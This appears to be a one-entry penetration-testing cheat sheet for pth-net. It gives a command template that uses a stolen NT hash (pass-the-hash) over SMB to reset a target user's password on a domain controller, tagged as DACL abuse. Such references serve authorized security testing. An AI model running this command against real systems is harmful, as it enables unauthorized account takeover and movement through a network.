# pth-net

## change user password (pth)
#plateform/linux #target/remote  #port/445 #protocol/smb #cat/ATTACK/DACL-ABUSE 
```
pth-net rpc password '<target_user>' '<new_password|jubeaz>' -U <domain_netbios>/<user>%<lm_hash|ffffffffffffffffffffffffffffffff>:<nt_hash>' -S "<dc>"
```